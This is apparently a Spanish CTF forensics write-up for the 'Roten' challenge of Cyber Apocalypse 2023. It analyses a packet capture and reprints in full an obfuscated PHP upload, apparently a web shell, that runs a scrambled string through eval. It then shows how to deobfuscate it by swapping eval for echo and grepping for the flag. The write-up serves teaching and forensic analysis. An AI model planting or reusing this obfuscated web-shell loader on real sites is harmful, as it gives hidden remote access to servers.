@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Roten Cyber Apocalypse 2023</title>
+
+  <meta name="description" content="Resolución del challenge Roten del Cyber Apocalypse 2023">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Roten Cyber Apocalypse 2023">
+  <meta name="twitter:description" content="Resolución del challenge Roten del Cyber Apocalypse 2023">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Roten Cyber Apocalypse 2023">
+  <meta property="og:description" content="Resolución del challenge Roten del Cyber Apocalypse 2023">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Roten Cyber Apocalypse 2023" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/ca2023" title="GatoGamer1155" class="blog-button">Cyber Apocalypse</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Cyber Apocalypse 2023</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Roten</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Una vez descomprimido el <code class="language-plaintext highlighter-rouge">zip</code> podemos ver los archivos que nos deja, realmente solo nos deja un archivo <code class="language-plaintext highlighter-rouge">challenge.pcap</code> que es una captura de <code class="language-plaintext highlighter-rouge">wireshark</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls</span><span class="p">
+ challenge.pcap  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir el archivo con <code class="language-plaintext highlighter-rouge">wireshark</code> y filtrar por <code class="language-plaintext highlighter-rouge">http</code> podemos ver una petición <code class="language-plaintext highlighter-rouge">POST</code> hacia <code class="language-plaintext highlighter-rouge">/man-update.php</code> que en su contenido parece tener un <code class="language-plaintext highlighter-rouge">php</code> ofuscado</p>
+<a href="/ca2023/roten/1.png" target="_blank"><div><p><img src="/ca2023/roten/1.png"></p></div></a>
+
+<p class="plain-text">Para copiar todo el contenido podemos dar clic a la derecha en <code class="language-plaintext highlighter-rouge">..as Printable Text</code></p>
+<a href="/ca2023/roten/2.png" target="_blank"><div><p><img src="/ca2023/roten/2.png"></p></div></a>
+
+<p class="plain-text">El contenido que nos copia consta de un <code class="language-plaintext highlighter-rouge">php</code> con una variable <code class="language-plaintext highlighter-rouge">$bhrTeZXazQ</code> que se conforma poco a poco de otras variables y al final la ejecuta con <code class="language-plaintext highlighter-rouge">eval</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">POST </span><span class="p">/map-update.php </span><span class="mi">HTTP/1.1
+</span><span class="o">Host</span><span class="p">:</span><span class="s"> targetaggregator.intergalacticministry.com
+</span><span class="o">User-Agent</span><span class="p">: </span><span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span class="o">Accept</span><span class="p">: </span><span class="s">text/html,application/xhtml+xml,application/xml;</span><span class="am">q</span><span class="o">=</span><span class="s">0.9,image/avif,image/webp,*/*;</span><span class="am">q</span><span class="o">=</span><span class="p">0.8
+</span><span class="o">Accept-Language</span><span class="p">: </span><span class="s">en-US,en;</span><span class="am">q</span><span class="o">=</span><span class="p">0.5
+</span><span class="o">Accept-Encoding</span><span class="p">: </span><span class="s">gzip, deflate
+</span><span class="o">Content-Type</span><span class="p">: </span><span class="s">multipart/form-data; </span><span class="am">boundary</span><span class="o">=</span><span class="s">---------------------------310973569542634246533468492466
+</span><span class="o">Content-Length</span><span class="p">: </span><span class="mi">7178
+</span><span class="o">Origin</span><span class="p">: </span><span class="s">http://targetaggregator.intergalacticministry.com
+</span><span class="o">Connection</span><span class="p">: </span><span class="s">keep-alive
+</span><span classo"p">Referer</span><span class="p">: </span><span class="s">http://targetaggregator.intergalacticministry.com/map-update.php
+</span><span class="o">Cookie</span><span class="p">: </span><span class="am">PHPSESSID</span><span class="o">=</span><span class="s">sj192ho64ue736f5651mn74j6l
+</span><span class="o">Upgrade-Insecure-Requests</span><span class="p">:</span><span class="mi"> 1
+</span><span class="p">
+-----------------------------310973569542634246533468492466
+</span><span class="o">Content-Disposition</span><span class="p">: </span><span class="s">form-data; </span><span class="am">name</span><span class="o">=</span><span class="s">"uploaded_file"; </span><span class="am">filename</span><span class="o">=</span><span class="s">"galacticmap.php"
+</span><span class="o">Content-Type</span><span class="p">: </span><span class="s">application/x-php
+</span><span class="p">
+&lt?php 
+$pPziZoJiMpcu = 82; 
+$liGBOKxsOGMz = array(); 
+$iyzQ5h8qf6 = "" ; 
+$iyzQ5h8qf6 .= "&ltnnyo ea\$px-aloerl0=e r\$0' weme Su rgsr s\"eu>\"e'Er= elmi)y ]_'t>bde e e  =p   xt\" ?ltps vdfic-xetrmsx'l0em0  o\"oc&'t [r\"e _e;eV.ncxm'vToil   ,F y"; 
+$iyzQ5h8qf6 .= "&ltr s -&lta  \"op r_P&lt poeeihaeild /ds\"se4bsxao1: r]du ;e\$'o,t dn\n)i\$'me'maoate{e  I!lb>'u btde .sr ege/ han:t"; 
+$iyzQ5h8qf6 .= "elrlenjl t>( 0'eCdd0  l et0\n'seu u it ;e_ dc>ulUd'T\nxe\$L&lter&lt.l oh>c  ii aert pdt iai(ed.QiJr\n\$i0; 0\"e0' d= ex ].xp\$r re \nwSn'u&ltlup ]o iluE/=>b\$t r>\n"; 
+$iyzQ5h8qf6 .= "h rxn ltmb \n'-aodd') bubaa\nff0 i0] )- [ &\"4 ==e[wn (r #iEa tftelF)U sspSb\"'rd  dO o e_t ppso \n]DpneaC;aoesvp\ni( }f0 & ' \"( ]0 =sc'o  \$s #nRmaeoi=oi)p te"; 
+$iyzQ5h8qf6 .= "l[>c;>ia ew   agP aw(d i;ep:rto\nnor/a/&ltl )\n( = ?;\$r\$0 0 'puwr\$\$d\" fgVeu'rp'al l s o'&lto\n&ltrs rn \" leeetu\$y f\nsl (en dtyjS3?e\$   ) 0 \ngem0=  xrtrlsdi; l E=t>ma\"d";  
+$iyzQ5h8qf6 .= "e{o  iafbl\nb. }ee &lt ptrchid>   cia''t  s qc.p)m{ \$ (0' rao0 ) 'ieid;ir\n adR'o\\ r.''\na ifdiro >'\$\ndr&ltt apmh(di\" ( rctE)"; 
+$iyzQ5h8qf6 .= "e mtlur3h;o  m{\$2x odd0(  )n't[\nr)  gi[dcnat\$   d n Dl>r R k}\"&lttr twso\$(r; i iatx;n iriei.p\nd\$ o m0' u\"e1\$\$ "; 
+$iyzQ5h8qf6 .= " t]e'} ) } r'io\"c/_in '  (ie': e&e\n>/b> hu( df)\n s ptap\nt nabrp6\n et d\$o0  p] )ogi?f)'r\n=  \n=ePrm;tfGda"; 
+$iyzQ5h8qf6 .= " ]e\"mrT;r s&ye\nto\" (i\$\"ii e s tici - ipryt/\n  y etd): [ & wrf (;]e\n {   cH'p\nioE=m [c.oeo\ne u  c hd; \$dd&ltrl.c e iohr L fca/ jf &p  ye   "; 
+$iyzQ5h8qf6 .= "\"= ?no('\"\n,a\n\$\n  HtP leorT'e 'h\$vcU d l'=h >y\n d(it.e h t onme e idr1-su  e &p ?' e 0 eu t%  d\$_   To_vecnm[f= nouetp \" t."; 
+$iyzQ5h8qf6 .= ">o \n> eifrd'o\"o ( n/es n eny.-/n 0=e e& - x(0'rp\$'1 \$'dP   BrSath=-'i' a p_ol >  \$    \n cri)>/w&lt  \$i:on: g "; 
+$iyzQ5h8qf6 .= "d. 1>bc x'l0= ''\$e\$0x[[m s g]iO   {yEleo'ddls m\"luro E}o_\$\"&lt &lt h.l &lt'n/\" _f ct  t  c-2\not 2dsx'0w;gcm0''\"o:% r,rS   W Lu= \"aieu\$e&ltopya r\nfG"; 
+$iyzQ5h8qf6 .= "v&ltt ? o'e.a.et&lt G Ft;0 h Co-.&ltoi 0'eAs0'\nruo2 eed 1 o  T   0\"Fe'\".trTbu'bal)d r\n Eabh p  /o  \$rd/ E(ie ' :eSm>2stoi0; 0'4  otd):xxe's u\$=[ "; 
+$iyzQ5h8qf6 .= "  w '=o&lt\$a'omp]rdo)' o}cTlre h \"'w\"hv(>t Tfltf)  xS/\n/csnf0 i0;0: uee  ee T% pw '  \$_.]\"f/_']Uil)>Da ] r\no[u>a p &lt.n&ltra\$\\a [ie-i; 'i b&ltjrt ( }f0 0  "; 
+$iyzQ5h8qf6 .= "p\" ?'cc&'1 [o\$d  dR ..ffS>.pto;&ltid{[} \nm'e\"d \n t\$e/eldnb 'l sl\n  t-osqirp )\n( })' []& -uu ;s\$'r_ii iO\$\"\$'oE"; 
+$iyzQ5h8qf6 .= "\\\"l'a\nbre\n' uimc);> fidvrtfui\"l deTte  .;-ocupar\$   )\n - \"  ''tt0\n\"selGrf rtd'd rRn'o>d red nepfam \n\n&lto"; 
+$iyzQ5h8qf6 .= "f>a(d=er;e o_rrn h \n>tretpim{ \$  ?' w=0w;eex ,.xdE'   _i iamV\"/a\"D >c_ all nd{? tr &ltl\$>').\n> weaea ef \nsir .no  "; 
+$iyzQ5h8qf6 .= "m{  ; r 0'\n'\"2  =e[T](\$=Armru>E;>d;i &lttf mso(d'\n> he(aud\\\" ' \" nxnam ai &lttpysmtd\$ o  '\n i(0  ]]0 \$sc'[;if _ e.t\"R\n '\nr boi eeai ] \n >ai ein../ ; lisme "; 
+$iyzQ5h8qf6 .= "dl lrt.riPet d\$ r \$t\$0: = 0 opuw'\nsi'D.t\"o;[e\">ee  rl ' dse, \n Pcsh)r\"  ' \n osf'= ee ia mcne y et ' gem4  ==  wrtrd}_l.a h f\n'c;\\cc sye ]{isx  &lt"; 
+$iyzQ5h8qf6 .= " eh_r .;\$\". \n ate)\" rs npsi=.r&p  y   r\"o)' ' ) nieii\nfe/Y\"o/oePh\nnht t.( .\nnee\$ t r de.'\n_'\$ \n dsr;' (i k/rn\"jm e &p : o]d - x(  en'tr\$i '}&ltd>ccHoe&lto"; 
+$iyzQ5h8qf6 .= "o y\"\$ ' gtcc a&ltm(if / S>v ? '('\n. 'z  3c.hss0=e e   u e?' '\$\$ rt]e'fl=;\n/=\"uhP cb ril._    (um bti\$r=\"' E\"a > ]\$) b Pe r.=jt\"(x'l0=e' p=  ; )gw\$[f)']ie \n\$h"; 
+$iyzQ5h8qf6 .= "';so_\"hr\"yfe&ltF u f\$td lrsd('/. R.l \n )f; a r(}e3\"st>\$1csx'l- [ &'\n  ros'(;];l(\$}d2G\n> S&lto>&lt  =/I p i_ir e>sir\"'\$ V u}\n )i\n s a\$\nl.h\"p&ltf0'e8l"; 
+$iyzQ5h8qf6 .= "s' \"( r i?or=r\"\n,\ne\$d\ni>Ee\\\"Ei &lt/=('bL l lGoe  \nire.>v E\$e\n\n  l  ehgf}=6t>:/i0; 0'e;\$r\$0' f ulse%  i di\$r\"Tcn\\Ln\"id fc>E o eEns c osa \"a Rv) \n {e"; 
+$iyzQ5h8qf6 .= "  nemi\n\"/t&lt/sl0 i0; \noem0  ('pdpa1 \$f=irds;'h&ltnFp&ltni\$io&ltS a  T:u l n l\$.l [a) &lt \n)  aaal\nscp//ce }f0 \$ wao0:  s[[rds w  r;i \n>o"; 
+$iyzQ5h8qf6 .= "i&lt'uipvdll/[ d '[ l a sap_ u 'l[ /  )  md:e?tsssmr))\n( }t ndd1  \$''\"i'% o(')\nr=e\" nb]tnu>ieob' e .'&ltt s &ltsaS\$e}Pu"; 
+$iyzQ5h8qf6 .= "n d     ee )>ys:cai    )\ny e\"e0' m een]1 ri')   c;\"pr. pt\"r_rrfed \$c/) s / tEv)\nHea i  {  (rp)\nl//rxp{{ \$  p r] )- o:xxt,s ls;  =sh\n&ltu>\"tu"; 
+$iyzQ5h8qf6 .= " ;.e:>ic  umb; = t\$hRa) P m v  \n  \$(u;\neb/ict\n  m{ e [ & ' d eef % ds\n{  coeit\\'ytt\n'xr&ltlhs pd>\n \" hk(Vl[ _.e >     f'b\n&ltsoapd> \$ o  = \"="; 
+$iyzQ5h8qf6 .= " ?;\$e'cc(\$1 [ei\n ra cn n p y\n/ie/eou l'&lt et >e\$Eun S ] \n     iCl hhojtn\n t d\$ ' e 0 \nw Suu\"os\$'tf  en\"hpt&ltmetpi'sdbT c o]b ca"; 
+$iyzQ5h8qf6 .= "&lt\nydRea E\" e&lt    hlai teta>.\n y et u x(0' o&'tt%w\"se(   ad\\ouyde=yef.t'ro'c a)r hbt  i[ m L&lt.c/    eecc mesx\nb&lt p  y '\$e\$0x r ;ee1n,.x\$(  lin tpit'p"; 
+$iyzQ5h8qf6 .= "= bs>>U&lte d)> olh =r'.e F/\"hh \$  a)h' ltt.\nod e &p ;ocm2' l0\n'\"se =e_\$  pr&lt\" evhhe'(a(E\"pbseD \"  e> >.P ] 'a&ltot f hd.e) >\"r"; 
+$iyzQ5h8qf6 .= "g&ltoi =e e \nwuo0  dx ]]\"r\$scPd  a(b&ltt= oi=sis\$r;lrsci{; \" N  'H\"  ]>/ m i ee'-; \n ao!tv 'l0=e ntd): [8 = ,[gpuOi  t\$riy'cdd'useur\no>fhr\n\n \$ta \$/P&lt.e &ltt\""; 
+$iyzQ5h8qf6 .= "l l ar\"C\n &lthpo-s  psx'l eee   \"0 == 'rrtSr  hd>npsl=dfbsnpo a&ltuoe   vam v'_/ l./d&lt> e d('o  !r.g-tc\$'e6-s r\" ?' e0 ' \$woieT   (i&ltpeua'eime"; 
+$iyzQ5h8qf6 .= "alr dbl c  fabe&lta.Sa\"s t>/    e')n  -eml rlm; 0'e []& - x  x(trun'[=  \$rfu=bsPnlitmo. 'rl't  oll&lt/l\$E>&lte\"d&ltt  = rC;t  -fieLaao i0;  \"  ''\$e) "; 
+$iyzQ5h8qf6 .= "'\$yipt]'=  d)ot'msO'et(ea  ]>y&lto  rue/tuvL&lt/ ?>tr    (o\nr   =naapsd}f0 i w=0w;wc  )wpt[f)d   i;r ti=S ''\$(dF [&lt br  ee-treaF/t{d&ltd>  \$h"; 
+$iyzQ5h8qf6 .= "'n o  L\".ptcse\n( }f r 0'\nou\$  oee'(;iN  r\nmtet'Tn  _\$Di 'biry  a hh>)l'td\not>\"  _eCt l rahcied=   )\n( i(0  rtoi?r)'r\"\nrU e.e yx'n'anvP_il t>n>.  c"; 
+$iyzQ5h8qf6 .= "\\o>\n u]d> wd ;  Gaoe : ettsssn\"= \$   \$t\$4: lewf l;]e% 'L c'capt a maaOFre mF &lt'  hnv\n {e >&lt n>\"\n  Ednn   aets.t.c  m{ \$oem0  d\"n('d\n,a1 ]L h/hce'vveemlS"; 
+$iyzQ5h8qf6 .= "Ie }pi'b&ltee &lte  \n).&ltt l\" }  Tett m dsp\"c cof o  mw\"o)' []e s[  ds )  o'ot= abn=euTLca\n_l.r/cx(br   ) td o..\n  [re- u ft:>oconi d\$ on]d - "; 
+$iyzQ5h8qf6 .= "\" r\$'' \$'% )oe . i'nlac'=e[Etl ne\$>bhe\$r    )\"d> a  e  '(nD s i /\nmomtl et de e?' w=[m e o]1  rc\$\$\"ohaurtd'='Sor a d&lt>occ>t &lt  ?>  dppc  d"; 
+$iyzQ5h8qf6 .= "'ti t lc/\n/m/ae  y er=  ; r \"o:x w,s { hfv&ltnime-yif's[re m'ib&lt (m\"a / {d\"\" =orh  oC-s -heom&ltapbip &p  [ &'\n i(ed e n % \n!oiah=de=fpriUu'ya e.r b\"'d;b t"; 
+$iyzQ5h8qf6 .= " \ni.  \"sio  woTp re(ma!jionee e &\"( r \$t\$xe'c e\$1  i ll2'd='oe'lpbf)d '\$.sr&ltcr\nl h  r . .in   "; 
+for($i = 0; $i &lt $pPziZoJiMpcu; $i++) $liGBOKxsOGMz[] = ""; 
+for($i = 0; $i &lt (strlen($iyzQ5h8qf6) / $pPziZoJiMpcu); $i++) { for($r = 0; $r &lt $pPziZoJiMpcu; $r++) $liGBOKxsOGMz[$r] .= $iyzQ5h8qf6[$r + $i * $pPziZoJiMpcu]; } 
+$bhrTeZXazQ = trim(implode("", $liGBOKxsOGMz)); 
+$bhrTeZXazQ = "?>$bhrTeZXazQ"; 
+eval( $bhrTeZXazQ ); 
+?>
+</span><span class="p">
+-----------------------------310973569542634246533468492466--</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">php</code> al final ejecuta todo el codigo ofuscado guardado en la variable <code class="language-plaintext highlighter-rouge">$bhrTeZXazQ</code> sin embargo al cambiarlo por <code class="language-plaintext highlighter-rouge">echo</code> podemos ver el contenido desofuscado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">eval</span><span class="p">( $bhrTeZXazQ );  
+
+</span><span class="o">echo </span><span class="p">$bhrTeZXazQ;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos el <code class="language-plaintext highlighter-rouge">php</code> modificado y lo ejecutamos guardando el <code class="language-plaintext highlighter-rouge">output</code> en <code class="language-plaintext highlighter-rouge">content</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ php </span><span class="p">php.php > content</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora si grepeamos por <code class="language-plaintext highlighter-rouge">HTB</code> en el codigo desofuscado podemos ver la <code class="language-plaintext highlighter-rouge">flag</code> en el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ grep </span><span class="p">HTB </span><span class="p">content -A1 -B1
+&lt?php
+$dir </span><span class="o">= </span><span class="no">realpath</span><span class="p">($dir</span><span class="o">.</span><span class="s">'/'</span><span class="o">.</span><span class="p">$value);
+</span><span class="c1">##flag = HTB{W0w_ROt_A_DaY}</span><span class="p">
+$dirs </span><span class="o">= </span><span class="no">scandir</span><span class="p">($dir);
+?></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
